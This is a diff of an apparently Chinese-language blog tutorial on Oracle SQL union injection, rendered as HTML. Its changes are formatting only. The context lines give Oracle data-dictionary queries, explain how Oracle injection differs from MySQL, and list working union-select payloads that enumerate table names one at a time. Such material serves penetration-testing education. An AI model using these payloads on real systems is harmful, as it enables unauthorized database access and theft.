@@ -262,12 +262,8 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dba_tab_columns  <span class="comment">--对应 dba_tables表 包含的所有表的列信息</span></span><br><span class="line">all_tab_columns  <span class="comment">--对应 all_tables表 包含的所有表的列信息</span></span><br><span class="line">user_tab_columns <span class="comment">--对应 user_tables表 包含的所有表的列信息</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;USERS&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="comment">--使用column_name关键字去查询列名</span></span><br></pre></td></tr></table></figure>
 
 <p>Oracle联合注入跟MySQL联合注入不同点</p>
-<ol>
-<li>后面必须跟上dual，否则报错；</li>
-<li>不能直接使用1,2,3填充，可以先用null填充，可通过’null’来判断当前列是字符型还是数字型</li>
-<li>Oracle如果只需返回一行数据是用rownum&#x3D;1来限制</li>
-</ol>
-<p>如果使用’null’填充该列报错则说明该列为数字型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、后面必须跟上dual，否则报错；</span><br><span class="line">2、不能直接使用1,2,3填充，可以先用null填充，可通过&#x27;null&#x27;来判断当前列是字符型还是数字型</span><br><span class="line">3、Oracle如果只需返回一行数据是用rownum=1来限制</span><br><span class="line">使用&#x27;null&#x27;填充该列报错则说明该列为数字型</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811224509218.png" alt="image-20250811224509218"></p>
 <p>爆表名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select NULL,NULL,(select table_name from user_tables where rownum=1),NULL from dual--+ --获取第一张表</span><br><span class="line">union select NULL,NULL,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#x27;刚才查出来的&#x27;),NULL from dual--+ --获取第二张表，&lt;&gt;是不等于的意思</span><br><span class="line">union select NULL,NULL,(select table_name from user_tables where rownum=1 and table_name not in (&#x27;刚才查出来的&#x27;)),NULL from dual--+ 也可以用not in()，一样的意思</span><br></pre></td></tr></table></figure>
